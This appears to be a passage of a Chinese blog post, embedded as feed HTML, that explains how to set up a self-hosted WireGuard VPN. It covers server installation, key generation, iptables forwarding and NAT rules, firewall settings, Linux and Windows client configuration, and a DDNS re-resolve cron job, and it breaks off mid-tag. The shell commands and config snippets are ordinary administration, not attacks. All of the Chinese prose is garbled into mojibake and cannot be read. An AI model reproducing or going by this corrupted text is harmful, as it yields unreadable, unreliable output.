    <content type="html"><![CDATA[<p>é¾™å“¥å°±æ˜¯é¾™ï¼æƒ¹å•Šï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ€è¿‘æ‰‹ä¸Šçš„å„ç§æœåŠ¡å™¨ä¸çŸ¥é“ä¸ºå•¥å¤šäº†èµ·æ¥ï¼Œä½†å¤§éƒ½æ²¡æœ‰å…¬ç½‘ IPï¼Œåˆéƒ½å¤„åœ¨ä¸åŒçš„å±€åŸŸç½‘é‡Œï¼Œç¬”è€…çš„è‚‰èº«è¿å¸¦è‡ªå·±çš„ç¬”è®°æœ¬ä¹Ÿæ²¡æœ‰åŠæ³•åŒæ—¶å¤„åœ¨è¿™äº›ä¸åŒçš„ç½‘ç»œå½“ä¸­ï¼Œå› æ­¤ç¬”è€…è¿«åˆ‡éœ€è¦ä¸€ä¸ªå¯ç”¨ä¸”ä¼˜é›…çš„å¼‚åœ°ç»„ç½‘æ–¹æ¡ˆï¼Œä»è€Œè®©ç¬”è€…èƒ½å¤Ÿæ— è®ºèº«å¤„ä½•å¤„éƒ½èƒ½éšæ—¶è®¿é—®ä¸åŒå±€åŸŸç½‘ä¸­çš„ä»»æ„ä¸€å°æœåŠ¡å™¨ï¼Œ <del>å½“ç„¶ç°åœ¨çœ‹æ¥è¿™äº›æœåŠ¡å™¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹çš„ç”¨é€”ä¼¼ä¹å°±æ˜¯è®©ç¬”è€…é—²æš‡æ—¶åˆ»è¿è¡Œ neofetch å’Œ btop ç©ç©</del></p><p>å±€åŸŸç½‘ï¼ˆLocal Area Networkï¼‰ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„å†…ç½‘ï¼Œæ­¤ç±»ç½‘ç»œé€šå¸¸å…±ç”¨ä¸€ä¸ªè¿æ¥åˆ°äº’è”ç½‘ï¼ˆå…¬ç½‘ï¼‰çš„è·¯ç”±å™¨ï¼Œå…±ç”¨åŒä¸€å…¬ç½‘ IPï¼Œåˆ©ç”¨ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNetwork Address Translationï¼‰æŠ€æœ¯ä¸ºå†…ç½‘ä¸­çš„è®¾å¤‡ä¸å…¬ç½‘æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼ˆç®€è€Œè¨€ä¹‹å°±æ˜¯å…¬ç½‘ <code>IP:ç«¯å£</code> åˆ°å†…ç½‘ <code>IP:ç«¯å£</code> æ•´äº†ä¸ªæ˜ å°„ï¼‰ï¼Œå› æ­¤è¦ä¸å†…ç½‘ä¸­çš„è®¾å¤‡è¿›è¡Œé€šä¿¡ï¼Œæˆ‘ä»¬å®è´¨ä¸Šè¦å®ç° <strong>å†…ç½‘ç©¿é€</strong> ï¼Œä¹Ÿå« <strong>NAT ç©¿é€</strong> ï¼ˆNAT traversalï¼‰</p><p><img src="https://s2.loli.net/2024/10/10/MjaG5i82cKsqoXz.png"></p><p>è¿™ä¸ªéœ€æ±‚çš„å®ç°å…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠä¸åŒ LAN å½“ä¸­çš„è®¾å¤‡ç»„åˆ°åŒä¸€ä¸ªè™šæ‹Ÿç½‘ç»œå½“ä¸­å°±è¡Œâ€”â€” <code>Virtual Private Network</code> å°±æ˜¯ä¸“ä¸šå¹²è¿™ä¸ªçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ VPN æŠ€æœ¯åœ¨è®¾å¤‡é—´å»ºç«‹ç‚¹å¯¹ç‚¹çš„åŠ å¯†ä¿¡é“ï¼Œä»è€Œå°†ä¸åŒå±€åŸŸç½‘å½“ä¸­çš„æœåŠ¡å™¨è¿æ¥èµ·æ¥ï¼Œè€Œè‹¥è¦ä¸ºéƒ½å¤„äºå†…ç½‘çš„æœºå™¨è¿›è¡Œæ‰“æ´ï¼Œåˆ™é€šå¸¸éœ€è¦æœ‰ä¸€å°ä½äºå…¬ç½‘çš„æœåŠ¡å™¨ä¸ºä»–ä»¬è¿›è¡Œä¸­ç»§ï¼š</p><p><img src="https://s2.loli.net/2024/10/21/I62pACK4hQedEnB.png"></p><p>ç°æœ‰çš„æ¯”è¾ƒæˆç†Ÿçš„æ— éœ€ç”¨æˆ·è‡ªè¡Œåœ¨å…¬ç½‘æ¶è®¾æœåŠ¡å™¨çš„å¼‚åœ°ç»„ç½‘æœåŠ¡æœ‰ tailscaleã€zerotier ç­‰ï¼Œä½†ç”±äºå…¶åœ¨ä¸­å›½å¤§é™†å†…é€šå¸¸æ²¡æœ‰ç›¸åº”çš„ä¸­ç»§æœåŠ¡å™¨ï¼Œä»è€Œå¯¼è‡´åœ¨å›½å†…æƒ³è¦é€šè¿‡æ­¤ç±»æœåŠ¡è¿›è¡Œè¿æ¥åˆ™å¾€å¾€å¸¦æœ‰ä¸€å®šçš„å»¶è¿Ÿï¼ˆåæ­£ç¬”è€…æ˜¯å¿å—ä¸äº†ï¼‰</p><p><img src="https://s2.loli.net/2024/10/21/gfMBh2R81baV5SG.png"></p><p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿä¸éš¾æƒ³åˆ°æˆ‘ä»¬å¯ä»¥åœ¨å…¬ç½‘ VPS ä¸Šè‡ªè¡Œæ­å»º tailscale çš„ DERP èŠ‚ç‚¹ï¼Œæˆ–æ˜¯è‡ªå»º zerotier çš„ Moon èŠ‚ç‚¹ï¼Œä½†æ—¢ç„¶éƒ½è¦è‡ªå»ºèŠ‚ç‚¹äº†ï¼Œ <em>é‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸ç›´æ¥è‡ªå»º VPN å‘¢</em> â€”â€” è¯¸å¦‚ IPSecã€OpenVPN ç­‰è€ç‰Œ VPN æ–¹æ¡ˆå¯è°“æ˜¯åº”æœ‰å°½æœ‰</p><p>ä½†ç›¸æ¯”äºè¿™äº›ä¼ ç»Ÿæ–¹æ¡ˆï¼Œç¬”è€…æ›´æ„¿æ„é€‰æ‹©è¢« Linus é’çç”šè‡³å·²ç»åˆå¹¶å…¥ Linux kernel mainline çš„ <strong>WireGuard</strong> â€”â€” è¿™æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„åŸºäº UDP çš„ç°ä»£ VPN åè®®ï¼Œæˆ–è®¸ä¹Ÿæ˜¯ç›®å‰å·²çŸ¥çš„æœ€å¥½çš„ VPN è§£å†³æ–¹æ¡ˆ</p><p><img src="https://s2.loli.net/2024/10/22/8M5FgnkYtdzCqVU.png"></p><p>æœ¬ç¯‡åšå®¢ä¸»è¦è®²è¿°å¦‚ä½•åˆ©ç”¨å…¬ç½‘æœåŠ¡å™¨æ­å»º WireGuard VPN ç½‘ç»œ</p><h1 id="0x01-å…¬ç½‘æœåŠ¡å™¨åŸºæœ¬é…ç½®"><a href="#0x01-å…¬ç½‘æœåŠ¡å™¨åŸºæœ¬é…ç½®" class="headerlink" title="0x01. å…¬ç½‘æœåŠ¡å™¨åŸºæœ¬é…ç½®"></a>0x01. å…¬ç½‘æœåŠ¡å™¨åŸºæœ¬é…ç½®</h1><h2 id="å®‰è£…ä¸é…ç½®-WireGuard"><a href="#å®‰è£…ä¸é…ç½®-WireGuard" class="headerlink" title="å®‰è£…ä¸é…ç½® WireGuard"></a>å®‰è£…ä¸é…ç½® WireGuard</h2><p>é¦–å…ˆæˆ‘ä»¬åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šå®‰è£… WireGuardï¼Œç¬”è€…è¿™é‡Œæ˜¯ <code>Ubuntu 24.04</code>ï¼š</p><blockquote><p>å‚è€ƒï¼š <a href="https://www.wireguard.com/install/">WireGuard - Installation</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y wireguard</span><br></code></pre></td></tr></table></figure><p>å®Œæˆå®‰è£…ä¹‹åæˆ‘ä»¬ä¼šè·å¾—ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œä»¥åŠç›¸åº”çš„ç”¨æˆ·æ€ CLI ç¨‹åº <code>wg</code> ï¼š</p><p><img src="https://s2.loli.net/2024/10/21/Aiw9cQTp4k537B6.png"></p><p>æ¥ä¸‹æ¥ä½¿ç”¨ <code>wg</code> ç”Ÿæˆä¸€ä»½ç§é’¥ä¸å¯¹åº”çš„å…¬é’¥ï¼Œå­˜æ”¾åœ¨ <code>/etc/wireguard</code> ç›®å½•ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»º WireGuard é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾åœ¨ <code>/etc/wireguard/wg0.conf</code> ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = ç§é’¥æ–‡ä»¶å†…å®¹<br><span class="hljs-attr">ListenPort</span> = è‡ªå®šä¹‰çš„ç›‘å¬ç«¯å£<br><span class="hljs-attr">Address</span> = è‡ªå®šä¹‰çš„å†…ç½‘åœ°å€ï¼Œä¾‹å¦‚ <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ä½ çš„èƒ½è®¿é—®å…¬ç½‘çš„ç½‘å¡å -j MASQUERADE</span><br><span class="hljs-attr">PreDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o ä½ çš„èƒ½è®¿é—®å…¬ç½‘çš„ç½‘å¡å -j MASQUERADE</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>PostUp</code> ä¸ <code>PreDown</code> å‚æ•°åˆ†åˆ«ä¸ºæ¥å£å¯åŠ¨æ—¶ä¸å…³é—­æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œå­˜åœ¨å¦‚ä¸‹å››ä¸ªæ‰§è¡ŒèŠ‚ç‚¹ï¼š</p><ul><li><code>PreUp</code> ï¼šåœ¨ç½‘ç»œæ¥å£åˆ›å»ºå‰æ‰§è¡Œ</li><li><code>PostUp</code> ï¼šåœ¨ç½‘ç»œæ¥å£åˆ›å»ºåæ‰§è¡Œ</li><li><code>PreDown</code> ï¼šåœ¨ç½‘ç»œæ¥å£åˆ é™¤å‰æ‰§è¡Œ</li><li><code>PostDown</code> ï¼š åœ¨ç½‘ç»œæ¥å£åˆ é™¤åæ‰§è¡Œ</li></ul><p>ç°åœ¨æˆ‘ä»¬è§£æå…·ä½“å‘½ä»¤ï¼Œå…¶ä¸­ <code>wg0</code> ä¸ºæˆ‘ä»¬åé¢è¦åˆ›å»ºçš„è™šæ‹Ÿç½‘å¡åï¼Œè¯¥å‘½ä»¤ä¸»è¦æ˜¯ä½¿ç”¨ iptables è¿›è¡Œæµé‡è½¬å‘ï¼Œåœ¨å¯åŠ¨ WireGuard æ—¶æ·»åŠ è½¬å‘è§„åˆ™ï¼Œåœ¨åœç”¨æ—¶åˆ é™¤è½¬å‘è§„åˆ™ï¼š</p><ul><li><code>iptables -A FORWARD -i wg0 -j ACCEPT</code> ï¼šï¼ˆé»˜è®¤ filter è¡¨ï¼‰åœ¨ FORWARD é“¾æ·»åŠ è§„åˆ™â€”â€”å…è®¸ä» <code>wg0</code> æ¥å£è½¬å‘å…¥æµé‡</li><li><code>iptables -A FORWARD -o wg0 -j ACCEPT</code> ï¼šï¼ˆé»˜è®¤ filter è¡¨ï¼‰åœ¨ FORWARD é“¾æ·»åŠ è§„åˆ™â€”â€”å…è®¸è½¬å‘æµé‡å‡ºåˆ° <code>wg0</code> æ¥å£</li><li><code>iptables -t nat -A POSTROUTING -o ä½ çš„èƒ½è®¿é—®å…¬ç½‘çš„ç½‘å¡å -j MASQUERADE</code> ï¼šä½¿ç”¨ NAT è¡¨ï¼Œåœ¨ POSTROUTING é“¾æ·»åŠ è§„åˆ™â€”â€”å¯¹å‘å‡ºçš„æ•°æ®åšåœ°å€ä¼ªè£…ä½¿å…¶çœ‹èµ·æ¥åƒä»æœ¬åœ°ç½‘å¡å‘å‡ºçš„æ•°æ®åŒ…ï¼Œ <code>MASQUERADE</code> å³æ„å‘³ç€ä¿®æ”¹å‡ºç«™çš„åŒ…çš„æºåœ°å€ä¸ºè¯¥ç½‘å¡çš„ ip</li></ul><blockquote><p>å¦‚æœä½ ä¸è®°å¾— iptables å››è¡¨äº”é“¾ï¼Œå¯ä»¥ç®€å•å›å¿†ä¸€ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2025/06/30/ZDag5SrP2HMQ9kI.png"></p><p><del>ä¸ºä»€ä¹ˆä¸ç”¨ nftablesï¼Ÿå› ä¸ºğŸ‘´æ‡’å¾—ä¸¤ä¸ªéƒ½å†™äº†ï¼Œåæ­£èƒŒåéƒ½æ˜¯ netfilter</del></p></blockquote><p>å¯¹äºå¯ä»¥è®¿é—®å…¬ç½‘çš„ç½‘å¡çš„åç§°ï¼Œå¯ä»¥ç®€å•é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè·å–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip -o -4 route show to default | awk <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨è¯¥æ¥å£ï¼Œå…¶ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ <code>wg0</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/10/21/nvVi1fWaR3ZLDEd.png"></p><p>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥ä¸º <code>wg0</code> æ¥å£é…ç½®è‡ªå¯åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®é˜²ç«å¢™"><a href="#é…ç½®é˜²ç«å¢™" class="headerlink" title="é…ç½®é˜²ç«å¢™"></a>é…ç½®é˜²ç«å¢™</h2><p>ä¸ºäº†è®© iptables è§„åˆ™æ­£å¸¸å·¥ä½œï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹é˜²ç«å¢™ä»¥å…è®¸ IPV4 æµé‡è½¬å‘ï¼Œé¦–å…ˆç¼–è¾‘ <code>/etc/sysctl.conf</code> æ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">net.ipv4.ip_forward</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¹Ÿå¯ä»¥åœ¨ WireGuard é…ç½®æ–‡ä»¶ä¸­çš„ <code>[Interface]</code> æ·»åŠ å¦‚ä¸‹é…ç½®æ¥åŠ¨æ€å¼€å…³ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">PostUp</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">1</span><br><span class="hljs-attr">PostDown</span> = sysctl -w net.ipv4.ip_forward=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></blockquote><p>ç„¶åé‡æ–°è½½å…¥é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -p</span><br></code></pre></td></tr></table></figure><p>æœ€åå¼€å¯ wireguard ç›‘å¬ç«¯å£ä¸Šçš„ UDP è¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow ä½ çš„è‡ªå®šä¹‰ç«¯å£/udp</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ ä½¿ç”¨é˜¿é‡Œäº‘è¿™æ ·æ¯”è¾ƒä¸“ä¸šçš„äº‘æœåŠ¡å™¨æä¾›å•†ï¼Œä½ å¯èƒ½è¿˜éœ€è¦åœ¨ç›¸åº”çš„æ§åˆ¶å°é¡µé¢æ·»åŠ è§„åˆ™ï¼š</p><p><img src="https://s2.loli.net/2024/10/21/XmPRkVf6yJzWKCj.png"></p></blockquote><h1 id="0x02-å®¢æˆ·ç«¯åŸºæœ¬é…ç½®"><a href="#0x02-å®¢æˆ·ç«¯åŸºæœ¬é…ç½®" class="headerlink" title="0x02. å®¢æˆ·ç«¯åŸºæœ¬é…ç½®"></a>0x02. å®¢æˆ·ç«¯åŸºæœ¬é…ç½®</h1><h2 id="Linux-å®¢æˆ·ç«¯é…ç½®"><a href="#Linux-å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="Linux å®¢æˆ·ç«¯é…ç½®"></a>Linux å®¢æˆ·ç«¯é…ç½®</h2><h3 id="åŸºç¡€é…ç½®"><a href="#åŸºç¡€é…ç½®" class="headerlink" title="åŸºç¡€é…ç½®"></a>åŸºç¡€é…ç½®</h3><p>é¦–å…ˆè¿˜æ˜¯æŒ‰æƒ¯ä¾‹åœ¨æœ¬åœ°å®‰è£… WireGuardï¼Œè¿™é‡Œç¬”è€…çš„ç³»ç»Ÿæ˜¯ <code>openSUSE Tumbleweed</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wireguard-tools</span><br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰æƒ¯ä¾‹ç”Ÿæˆå…¬é’¥ä¸ç§é’¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wg genkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/privatekey | wg pubkey | sudo <span class="hljs-built_in">tee</span> /etc/wireguard/publickey</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ <strong>æœåŠ¡ç«¯</strong> é…ç½®æ–‡ä»¶ï¼Œ <strong>æ·»åŠ </strong> å®¢æˆ·ç«¯é…ç½®å¦‚ä¸‹ï¼š</p><blockquote><p>æ¯æ–°å¢ä¸€ä¸ªå®¢æˆ·ç«¯å°±æ·»åŠ ä¸€ä»½ <code>[Peer]</code> é…ç½®</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = å®¢æˆ·ç«¯ç”Ÿæˆçš„å…¬é’¥<br><span class="hljs-attr">AllowedIPs</span> = è‡ªå®šä¹‰çš„å†…ç½‘åœ°å€ï¼Œä¾‹å¦‚ <span class="hljs-number">10.0</span>.<span class="hljs-number">0.2</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>ç„¶åé‡å¯ <strong>æœåŠ¡ç«¯ WireGuard</strong> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick down wg0 &amp;&amp; sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <strong>å®¢æˆ·ç«¯</strong> åˆ›å»ºé…ç½®æ–‡ä»¶ <code>/etc/wireguard/wg0.conf</code> ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = å®¢æˆ·ç«¯ç”Ÿæˆçš„ç§é’¥<br><span class="hljs-attr">Address</span> = ä¸Šé¢é…ç½®çš„å®¢æˆ·ç«¯åœ°å€<br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = æœåŠ¡ç«¯çš„å…¬é’¥<br><span class="hljs-attr">Endpoint</span> = æœåŠ¡ç«¯çš„å…¬ç½‘åœ°å€æˆ–æ˜¯åŸŸå:æœåŠ¡ç«¯çš„ç«¯å£<br><span class="hljs-attr">AllowedIPs</span> = æœåŠ¡ç«¯ç½‘æ®µï¼Œä¾‹å¦‚ <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ ä¸æ­¢æƒ³è¦ç»„ç½‘ï¼Œè¿˜æƒ³è¦è®© WireGuard æœåŠ¡ç«¯ä»£ç†å®¢æˆ·ç«¯çš„å…¨éƒ¨æµé‡ï¼Œåªéœ€è¦é…ç½®å®¢æˆ·ç«¯çš„ <code>AllowedIPs = 0.0.0.0/0</code> å³å¯</p></blockquote><p>æœ€åæŒ‰æƒ¯ä¾‹å¯åŠ¨å®¢æˆ·ç«¯çš„ WireGuard å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo wg-quick up wg0</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæœ‰éœ€è¦ï¼Œå¯ä»¥é…ç½®è‡ªå¯åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> wg-quick@wg0</span><br></code></pre></td></tr></table></figure><h3 id="é…ç½®-DDNS"><a href="#é…ç½®-DDNS" class="headerlink" title="é…ç½® DDNS"></a>é…ç½® DDNS</h3><p>ä½œä¸ºä¸­ç»§çš„å…¬ç½‘æœåŠ¡å™¨çš„ IP åœ¨æŸäº›éœ€æ±‚ä¸‹ä¸ä¸€å®šæ˜¯æ’å®šçš„ï¼Œè™½ç„¶è¯´åŸŸåé€šå¸¸æ˜¯å¯ä»¥ä¸å˜çš„ï¼Œä½†æœ‰çš„æ—¶å€™åŸŸåå¯¹åº”çš„ IP å¯èƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œè€Œ WireGuard ä¸ä¼šé‡å¤è¿›è¡Œè§£æï¼Œä»…ä¼šä½¿ç”¨ç¬¬ä¸€æ¬¡çš„ç»“æœï¼Œä»è€Œå¯èƒ½é€ æˆç»„ç½‘å¤±è´¥ ï¼šï¼ˆ</p><p>å¯¹äº Linuxï¼ŒWireGuard å®˜æ–¹å·²ç»æä¾›äº† <a href="https://github.com/WireGuard/wireguard-tools/tree/master/contrib/reresolve-dns">ä¸€ä»½è‡ªåŠ¨é‡æ–°è§£æ DNS çš„è„šæœ¬</a> ï¼Œæˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªå®šæ—¶æ‰§è¡Œä»»åŠ¡å³å¯ï¼Œä¾‹å¦‚ä½¿ç”¨ <code>crontab</code> ï¼š</p><blockquote><p>åœ¨ Ubuntu ä¸‹ï¼Œè¯¥è„šæœ¬ä¼¼ä¹ä¼šé»˜è®¤åœ¨ <code>/usr/share/doc/wireguard-tools/examples/reresolve-dns/reresolve-dns.sh</code> å®‰è£…ä¸€ä»½</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cron">1 * * * * è„šæœ¬æ‰€åœ¨ç›®å½•/reresolve-dns.sh wg0 # æ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡<br></code></pre></td></tr></table></figure><h2 id="Windows-å®¢æˆ·ç«¯é…ç½®"><a href="#Windows-å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="Windows å®¢æˆ·ç«¯é…ç½®"></a>Windows å®¢æˆ·ç«¯é…ç½®</h2><blockquote><p>ä¸ç”¨ Windows ğŸ‘‹</p></blockquote><p>é¦–å…ˆä»<a href="https://download.wireguard.com/windows-client/">å®˜ç½‘</a>ä¸‹è½½å¯¹åº”æ¶æ„çš„å®‰è£…åŒ…å¹¶å®‰è£…ï¼Œé€‰æ‹©æ–°å»ºç©ºéš§é“ï¼š</p><p><img src="https://s2.loli.net/2024/10/22/mlQ3A6qL8pH7uW1.png"></p><p>å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä»½ç§é’¥å’Œå…¬é’¥ï¼Œæˆ‘ä»¬åªéœ€è¦å†æŒ‰ç…§å‰é¢çš„æ–¹å¼å¡«å†™é…ç½®æ–‡ä»¶å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/10/22/osNnbW2zGuFT9I7.png"></p><p>ä¹‹ååœ¨æœåŠ¡ç«¯ä¹Ÿæ·»åŠ ç›¸åº”é…ç½®å¹¶é‡å¯ WireGuard å³å¯</p><h1 id="0x03-åŠ¨æ€è°ƒæ•´æœåŠ¡å™¨çš„å®¢æˆ·ç«¯è®°å½•"><a href="#0x03-åŠ¨æ€è°ƒæ•´æœåŠ¡å™¨çš„å®¢æˆ·ç«¯è®°å½•" class="headerlink" title="0x03. åŠ¨æ€è°ƒæ•´æœåŠ¡å™¨çš„å®¢æˆ·ç«¯è®°å½•"></a>0x03. åŠ¨æ€è°ƒæ•´æœåŠ¡å™¨çš„å®¢æˆ·ç«¯è®°å½•</h1><p>æˆ‘ä»¬ä¸éš¾å‘ç°å¦‚æœæ¯æ¬¡æ·»åŠ ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯æˆ–åˆ é™¤ä¸€ä¸ªæ—§çš„å®¢æˆ·ç«¯éƒ½è¦åœ¨ä¿®æ”¹å®Œ <code>wg.conf</code> æ–‡ä»¶ä¹‹åé‡å¯ WireGuard ä¼¼ä¹æœ‰ç‚¹å¤ªæ„šè ¢äº†ï¼ˆè™½ç„¶è®¾è®¡ä¸Šæ˜¯åå‘äºé¢„å…ˆé…ç½®å¥½ç½‘ç»œæ‹“æ‰‘ <del>æ‰€ä»¥è¯´ä¼˜é›…åœ¨å“ª</del> ï¼‰ï¼Œå› æ­¤æœ¬èŠ‚è®²è¿°å¦‚ä½•åœ¨ä¿æŒæœåŠ¡ç«¯çš„ WireGuard æŒç»­è¿è¡Œçš„æƒ…å†µä¸‹è°ƒæ•´æœåŠ¡å™¨ä¸Šçš„å®¢æˆ·ç«¯è®°å½•</p><h2 id="åŠ¨æ€å¢åŠ æ–°çš„å®¢æˆ·ç«¯"><a href="#åŠ¨æ€å¢åŠ æ–°çš„å®¢æˆ·ç«¯" class="headerlink" title="åŠ¨æ€å¢åŠ æ–°çš„å®¢æˆ·ç«¯"></a>åŠ¨æ€å¢åŠ æ–°çš„å®¢æˆ·ç«¯</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åŠ¨æ€æ·»åŠ æ–°çš„å®¢æˆ·ç«¯é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span 